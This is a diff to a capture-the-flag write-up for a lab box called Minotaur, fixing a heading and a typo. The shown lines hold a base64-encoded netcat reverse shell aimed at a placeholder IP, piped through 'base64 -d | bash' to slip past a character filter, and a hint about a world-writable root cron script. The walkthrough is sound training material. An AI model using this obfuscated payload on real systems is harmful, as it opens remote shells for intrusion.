@@ -1,4 +1,4 @@
-Writeup Minotaur-Box
+## Writeup Minotaur-Box
 
 nmap scan:
 PORT     STATE SERVICE  VERSION
@@ -57,7 +57,7 @@ to this
 cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y=
 
 since the equals sign is also filterd you will have to remove it witch leaves you with this payload
-eco "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash
+echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash
 then you get access to to machine and find the user flag located in /home/user/
 
 you see theres cronjob running on a file owend by root(location: /timer/timer.sh) but wrteable by everyone
